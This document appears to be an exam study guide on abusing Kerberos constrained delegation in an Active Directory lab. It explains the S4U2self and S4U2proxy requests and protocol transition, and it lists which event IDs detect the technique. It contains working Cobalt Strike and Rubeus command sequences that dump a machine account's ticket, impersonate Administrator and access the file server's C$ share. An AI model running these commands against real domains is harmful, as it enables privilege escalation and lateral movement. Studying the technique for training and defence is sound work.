01The one idea

Every Kerberos service ticket is a claim, and it claims exactly two things: who you get to be, and which service you get to be them to. Nothing else. Get this and the rest follows.

A service ticket — the only two fields that matter
ServiceNamecifs/lon-fs-1
UserNamedyork
ServiceRealmCONTOSO.COM
Flags name_canonicalizepre_authentrenewableforwardable

Try to use it somewhere else. The ticket above is a pass for dyork to the cifs service on lon-fs-1. Click a resource:

This is the whole game

To act as dyork against lon-fs-1, you need a ticket whose ServiceName is cifs/lon-fs-1 and whose UserName is dyork. You cannot edit the one you hold. You have to get the KDC to print you a new one — and the KDC is not going to do that for just anyone.

Constrained delegation is the machinery that makes the KDC print it. Everything on this page is about the three things the KDC checks before it does.

02Why delegation exists at all

A normal Kerberos login is one hop. Delegation is what happens when a service needs to make a second hop as the user — and discovers it has nothing to make it with.

Why can't the service just do it?

Three obvious ideas, all of which fail. Click one:

The mental model

Delegation is not "the service steals the user's password". It is the KDC agreeing to issue a second ticket on the service's word. So the question is never "how do I impersonate?" — it is "what does the KDC require before it will print the ticket?". Constrained delegation answers that with three conditions, and the next sections walk them one at a time.

03The two attributes — two different jobs

Constrained delegation is configured in two places, and people mix them up constantly. One is a list of destinations. The other is a permission to invent identities.

msDS-AllowedToDelegateTo

Question it answers: which services may I ask for a ticket to?

On the front-end computer object. A list of target SPNs:

cifs/lon-fs-1.contoso.com
cifs/lon-fs-1

If the SPN you request is not in this list, the KDC refuses. That is the constrained in constrained delegation — it replaces unconstrained delegation's "any service in the domain".

Note both spellings get listed. The FQDN form and the short form are separate strings, so request the one that is actually present.

UAC bit 0x1000000

Question it answers: may I claim a user who never proved themselves to me?

On the same object, in userAccountControl:

TRUSTED_TO_AUTH_FOR_DELEGATION = 16777216
                              = 0x1000000

This is protocol transition. With it, the service may name any user in an S4U2self request and the KDC will vouch for them. Without it, the KDC only vouches for users it actually saw authenticate.

Default for a computer is 4096. Anything else means extra bits are set.

Find them with ldapsearch

beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1

beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl

userAccountControl: 16781312

Decode a userAccountControl value

The exam teaches [System.Convert]::ToBoolean($uac -band 16777216). That is a bitwise AND, one flag at a time. Try it here — the value below is 16781312, which is 4096 plus 16777216.

Read the flags, not the number

16781312 and 16781344 both look like "on" if you eyeball them. The first is protocol transition; the second adds PASSWD_NOTREQD and changes nothing about delegation. Mask the bit: value -band 16777216. If it is non-zero, PT is on.

04S4U2self vs S4U2proxy — the two tickets

This is the part that does not click, usually because both are described as "S4U" and both return "a ticket". They return different tickets for different purposes. Separate them in your head and the attack falls out.

S4U2self — "a ticket to myself"

Service for User to Self. The service asks the KDC:

"Give me a service ticket for dyork to me."

You get a ticket with ServiceName = LON-WS-1$ (the service's own name) and UserName = dyork.

Why it exists: if the user logged in over NTLM, the service never saw a Kerberos ticket to prove who they were. S4U2self manufactures that proof anyway.

What decides its quality: the KDC sets forwardable on it only if protocol transition is on. That single flag is the hinge for everything later.

S4U2proxy — "a ticket to the next hop"

Service for User to Proxy. The service shows the KDC a ticket for the user and asks:

"Turn this into a ticket for dyork to cifs/lon-fs-1."

You get a ticket with ServiceName = cifs/lon-fs-1 and UserName = dyork. This is the usable one.

What it needs: an evidence ticket for the user, addressed to the requesting service, carrying the forwardable flag — plus the target SPN on the whitelist.

The name: "proxy" because the service acts on behalf of the user, not as them.

The exchange

In plain words

S4U2self is a hand-stamp from the front desk: "dyork was here, at my service." S4U2proxy is showing that stamp at the next building's gate to get dyork a guest pass.

The gate checks two things before it stamps a pass: the hand-stamp must be transferable (forwardable), and your service must be on the list for that building (msDS-AllowedToDelegateTo). No stamp, no pass. Wrong building, no pass.

Where does the TGT come from?

Both requests are made as LON-WS-1$, so you need that computer account's TGT first. In practice: local admin on the host, dump the machine account hash, then Rubeus asktgt /user:LON-WS-1$ /rc4:<hash>. No host access, no S4U. This is the step the write-ups skip and the exam does not.

The easy case is the one the course shows first: PT on, forwardable everywhere, one command. 06The two attack cases

Same goal, different requirement. One UAC bit decides whether you can name your victim or must supply a real ticket — and that bit changes exactly one Rubeus parameter.

A · Protocol transition ON

You may name any user in the domain. Both requests in one command:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap

Rubeus runs S4U2self (because /impersonateuser was given), gets a forwardable ticket for Administrator, then runs S4U2proxy against the target.

B · Protocol transition OFF

You may not name a user. You must supply a ticket the KDC issued to one:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap

/tgs replaces /impersonateuser. Rubeus skips S4U2self and goes straight to S4U2proxy with the ticket you handed it.

What each parameter is actually doing

ParameterWhat it isWhy the KDC cares
/user:lon-ws-1$The principal configured for delegationIt must be a service the KDC knows and that holds the whitelist
/ticket:…LON-WS-1$'s TGTProves you are that service — without it the request is anonymous

Where the /tgs ticket comes from

You are already on LON-WS-1 — you had to be, to get its machine hash. That host caches service tickets for every user who authenticated to it with Kerberos. One of those is HTTP/lon-ws-1 for dyork, and the KDC issued it as forwardable. Enumerate the logon sessions (klist, triage, or an LSASS dump), pull that ticket out, and feed it to /tgs. You still cannot become anyone you like — you can only become users who left a ticket with this service.

Bronze Bit, briefly

CVE-2020-17049 let an attacker take a non-forwardable ticket and flip the flag by re-signing it with the service account's key — collapsing case B back into "become anyone". It is patched. On any current Windows build, a non-forwardable S4U2self ticket is a dead end, and the write-ups that end with "and you're Domain Admin" assume protocol transition is on.

08The confusions that cost marks

QuestionAnswer
Why can't I just forge a service ticket?It is encrypted with the target service's key. Forging cifs/lon-fs-1 needs lon-fs-1's hash; a golden ticket needs krbtgt. Without either, only the KDC can mint it.
S4U2self or S4U2proxy?S4U2self = a ticket for the victim to the service itself. S4U2proxy = trade that for a ticket to the target. You need both unless PT is off and you captured a real ticket.
Constrained vs unconstrained?Unconstrained sets TRUSTED_FOR_DELEGATION (524288) and hands the service the user's TGT, so it can reach any service. Constrained (S4U) gives it no TGT and limits it to msDS-AllowedToDelegateTo.
Constrained vs RBCD?RBCD puts msDS-AllowedToActOnBehalfOfOtherIdentity on the target, not the front-end. Different attribute, different abuse path (you create a machine account and set that attribute if you can write it). Do not mix them up in an answer.
Do I need Domain Admin first?No. You need local admin on the front-end to get its machine hash, plus any user with a ticket (case B) or PT on (case A). The point of the attack is to reach DA.
Why does the ticket need the machine's TGT?The KDC has to know who is asking. The TGT is that proof. Without it, no S4U request can be made at all.
What does the DC log?4769 on the KDC with S4U2Self / S4U2proxy in the Transited Services field, and a 4624 type 3 on the target. Quieter than reading LSASS, but not invisible.

09One-screen cheat sheet

The three conditions

1 · evidence ticket forwardable 2 · evidence ticket addressed to LON-WS-1$ 3 · target SPN in msDS-AllowedToDelegateTo

Protocol transition (UAC 0x1000000) decides whether condition 1 can be satisfied by S4U2self. With it off, satisfy it with a captured ticket via /tgs.

Recon

Exploit

# 1. machine TGT (needs local admin on the front-end for the hash)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:lon-ws-1$ /rc4:<hash> /nowrap

# 2a. PT ON — name anyone
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<tgt> /impersonateuser:Administrator /nowrap

# 2b. PT OFF — supply a captured forwardable ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<tgt> /tgs:<captured-tgs> /nowrap

# 3. use it
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:<victim> /password:FakePass /ticket:<s4u-ticket>
steal_token <pid>
ls \\lon-fs-1\c$
Exam-day reminders

Enumerate before you request: the whitelist is exact strings, and a missing FQDN suffix is a refusal. If S4U2proxy fails, look at the evidence ticket's flags before you touch the target SPN — most BADOPTIONs are condition 1, not condition 3.
